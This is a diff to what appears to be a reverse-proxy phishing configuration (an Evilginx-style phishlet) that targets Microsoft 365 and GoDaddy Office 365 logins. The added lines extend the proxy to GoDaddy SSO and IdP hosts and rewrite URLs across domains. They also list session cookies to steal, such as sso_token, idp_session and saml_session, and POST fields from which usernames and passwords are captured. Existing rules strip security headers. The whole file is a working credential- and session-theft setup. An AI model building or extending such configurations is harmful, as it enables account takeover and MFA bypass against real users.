@@ -13,6 +13,9 @@ proxy_hosts:
   - {phish_sub: 'email', orig_sub: 'email', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
@@ -27,6 +30,15 @@ sub_filters:
   - {triggers_on: 'email.secureserver.net', orig_sub: 'email', domain: 'secureserver.net', search: 'https://email\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'outlook.secureserver.net', orig_sub: 'outlook', domain: 'secureserver.net', search: 'https://outlook\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.secureserver.net', orig_sub: 'login', domain: 'secureserver.net', search: 'https://login\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://sso\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\\.godaddy\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://idp\\.godaddy\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  
+  # Cross-domain GoDaddy filters (trigger from Microsoft domains)
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://sso\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\\.godaddy\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://idp\\.godaddy\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'email', domain: 'secureserver.net', search: 'https://email\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   
   # Remove security headers
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
@@ -111,12 +123,33 @@ auth_tokens:
 
   # GoDaddy Office 365 email cookies
   - domain: '.secureserver.net'
-    keys: ['JSESSIONID', 'GD_SESSION', 'auth_token', 'session_id', 'OIDC', 'RPSAuth', 'RPSSecAuth']
+    keys: ['JSESSIONID', 'GD_SESSION', 'auth_token', 'session_id', 'OIDC', 'RPSAuth', 'RPSSecAuth', 'gd_auth', 'secureserver_session']
     type: 'cookie'
     force_post: false
   
   - domain: '.email.secureserver.net'
     keys: ['JSESSIONID', 'OutlookSession', 'X-OWA-CANARY', 'ClientId', 'sessionid', 'auth_key']
+    type: 'cookie'
+    force_post: false
+  
+  # GoDaddy SSO cookies
+  - domain: '.sso.secureserver.net'
+    keys: ['sso_token', 'JSESSIONID', 'auth_session', 'gd_sso', 'SSO_SESSION']
+    type: 'cookie'
+    force_post: false
+  
+  - domain: '.sso.godaddy.com'
+    keys: ['sso_token', 'JSESSIONID', 'auth_session', 'gd_sso', 'SSO_SESSION', 'idp_session']
+    type: 'cookie'
+    force_post: false
+  
+  - domain: '.godaddy.com'
+    keys: ['sso_token', 'auth_session', 'gd_session_id', 'idp_marker', 'SSO_COOKIE']
+    type: 'cookie'
+    force_post: false
+  
+  - domain: '.idp.godaddy.com'
+    keys: ['idp_session', 'auth_token', 'JSESSIONID', 'saml_session', 'federation_token']
     type: 'cookie'
     force_post: false
 
@@ -154,6 +187,30 @@ credentials:
     key: 'Password'
     search: '(.*)'
     type: 'post'
+  
+  # GoDaddy SSO username
+  gdUsername:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  
+  # GoDaddy SSO password
+  gdPassword:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  
+  # GoDaddy email field
+  gdEmail:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  
+  # GoDaddy login field
+  gdLogin:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
 
 auth_urls:
   - '/kmsi'
@@ -163,6 +220,12 @@ auth_urls:
   - '/ppsecure/post.srf'
   - '/adfs/ls/'
   - '/adfs/oauth2/'
+  - '/sso/idp/'
+  - '/sso/authenticate'
+  - '/idp/login'
+  - '/auth/sso'
+  - '/api/v1/auth'
+  - '/api/authenticate'
 
 login:
   domain: 'login.microsoftonline.com'
